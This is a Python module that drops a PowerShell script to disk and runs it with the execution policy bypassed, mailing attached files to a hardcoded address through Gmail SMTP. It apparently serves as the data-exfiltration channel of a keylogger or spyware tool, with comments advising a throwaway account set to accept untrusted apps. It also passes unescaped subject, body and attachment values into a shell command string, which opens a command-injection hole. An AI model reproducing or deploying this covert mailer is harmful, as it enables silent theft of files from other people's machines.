import Io,Helper
import subprocess,traceback

# GLOBAL VARS
# provide the credentials for you gmail account (not the main one ofc)*
# configure the account to accept untrusted apps

REC_ADD = "youremailaddress"
SEN_ADD = "youremailaddress"
SEN_PASS = "password"

# PowerShell script to use
script = '''Param([String]$Att,[String]$Subj,[String]$Body)
Function Send-EMail{
    Param ( [Parameter(`
             Mandatory=$true)]
    [String]$To,
            [Parameter(`
                Mandatory=$true)]
    [String]$From,
            [Parameter(`
                mandatory=$true)]
    [String]$Password,
            [Parameter(`
                Mandatory=$true)]
    [String]$Subject,
            [Parameter(`
                Mandatory=$true)]
    [String]$Body,
            [Parameter(`
                Mandatory=$true)]
    [String]$attachment
        )
    try{
        $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
        $Srv = \"smtp.gmail.com\" 
        
        if ($attachment -ne $null) {
            try{
                $Attachments = $attachment -split ("::");
                ForEach ($val in $Attachments){
                    $attch = New-Object System.Net.Mail.Attachment($val)
                    $Msg.Attachments.Add($attch)
                }                           
            }catch{
                exit 2; 
            }
        }

        $Client = New-Object Net.Mail.SmtpClient($Srv, 587) 
        $Client.EnableSsl = $true
        $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password)
        $Client.Send($Msg)
        Remove-Variable -Name Client
        Remove-Variable -Name Password
        exit 0;
        }catch{
            exit 3; 
        }
}
try{               
Send-EMail -attachment $Att -To "'''+REC_ADD+'''" -Body $Body -Subject $Subj -Password "'''+SEN_PASS+'''" -From "'''+SEN_ADD +'''"
}catch{
    exit 4; 
}'''

script_file_name = "WM.ps1"

def create_script():
    file_path = Io.os.path.join(Io.getThePath(),script_file_name)

    if not Io.check_file(file_path):
        try:
            with open(file_path,'w') as f:
                f.write(script)
            return True

        except FileExistsError:
            Io.logEvent(f"<Creating pw script>: OS Error [{repr(FileExistsError)}]")
            return True
        except OSError:
            Io.logEvent(f"<Creating pw script>: OS Error [{repr(OSError)}]")
            return False
        except IOError:
            Io.logEvent(f"<Creating pw script> IO Error {repr(IOError)}]")
            return False
    else: return True

def send_mail(subj,body,attachment):
    try:
        file_path = Io.os.path.join(Io.getThePath(),script_file_name)
        if Io.check_file(file_path) == False:
            result = create_script()
        # defining the params of our script (emailing)
        to_execute = f'powershell.exe -ExecutionPolicy ByPass -File "{file_path}" -Subj "{subj}" -Body "{body}" -Att "{attachment}"'
        # Running the script (using powershell and script file + params for the script)
        process_result = subprocess.Popen(to_execute,stdout=subprocess.sys.stdout)
        Io.logEvent(f"<Result of Email Sending> [{subj},{body},{attachment}]: {process_result.returncode}")
        return process_result
    except Exception:
        Io.logEvent(f"<Problem in Email Sending>")
        return 1
